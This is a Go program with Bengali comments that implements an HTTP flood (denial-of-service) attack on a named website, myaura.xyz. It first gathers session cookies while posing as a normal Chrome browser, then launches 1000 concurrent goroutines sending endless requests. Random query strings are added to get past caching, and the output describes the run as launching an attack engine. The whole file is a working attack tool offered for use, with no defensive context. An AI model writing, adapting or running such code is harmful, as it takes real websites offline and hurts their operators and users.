package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"time"
)

func main() {
	target := "https://myaura.xyz/"
	threads := 1000

	// ১. কুকি রাখার জন্য একটি "Jar" বা বয়াম তৈরি করা
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     jar,
		Timeout: 10 * time.Second,
	}

	fmt.Println("🕵️ Phase 1: Visiting site like a normal user to collect cookies...")

	// ২. সাধারণ ইউজারের মতো প্রথমবার সাইট ভিজিট করা
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("❌ Error during warm-up:", err)
		return
	}
	resp.Body.Close()

	fmt.Printf("✅ Cookies Collected! Status: %d\n", resp.StatusCode)
	fmt.Println("🚀 Phase 2: Launching Vortex Engine with collected session...")

	// ৩. এবার ওই কুকি ব্যবহার করে অ্যাটাক শুরু
	for i := 0; i < threads; i++ {
		go func(id int) {
			for {
				// রেন্ডম কুয়েরি যাতে ক্যাশ মেমোরি ফাঁকি দেওয়া যায়
				url := fmt.Sprintf("%s?samer_official=%d", target, rand.Intn(999999))
				
				// এবার সরাসরি client.Get ব্যবহার করছি কারণ jar-এ অলরেডি কুকি আছে
				r, err := client.Get(url)
				if err == nil {
					if id == 0 {
						fmt.Printf("📡 Status: %d | Cookies Active\n", r.StatusCode)
					}
					r.Body.Close()
				} else {
					time.Sleep(100 * time.Millisecond)
				}
			}
		}(i)
	}

	// ইঞ্জিন সচল রাখা
	select {}
}
